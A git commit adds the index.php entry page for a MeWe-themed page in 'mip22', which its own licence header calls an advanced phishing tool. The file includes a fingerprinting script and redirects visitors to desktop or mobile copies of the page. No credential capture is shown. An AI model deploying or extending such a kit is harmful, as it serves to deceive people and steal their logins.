d8c9c27415ebfa2bc8a03c918477eba5567d9394
mak <makindosx@gmail.com>
2022-02-24 14:48:18 -0500

    Add files via upload

---
+++ .pages/mewe/index.php
@@ -0,0 +1,33 @@
+<?php 
+
+/*
+*  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
+*  mip22 is a advanced phishing tool.
+*
+*  mip22 is free software: you can redistribute it and/or modify
+*  it under the terms of the GNU Affero General Public License as published by
+*  the Free Software Foundation, either version 3 of the License, or
+*  (at your option) any later version.
+*
+*  mip22 is distributed in the hope that it will be useful,
+*  but WITHOUT ANY WARRANTY; without even the implied warranty of
+*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+*  GNU Affero General Public License for more details.
+*
+*  You should have received a copy of the GNU Affero General Public License
+*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
+*
+*/
+
+include 'fingerprints.php';
+
+?>
+
+<script type="text/javascript">
+if (screen.width >= 700) {
+document.location = "index.html";
+}
+else {
+document.location = "mobile.html";
+}
+</script> 
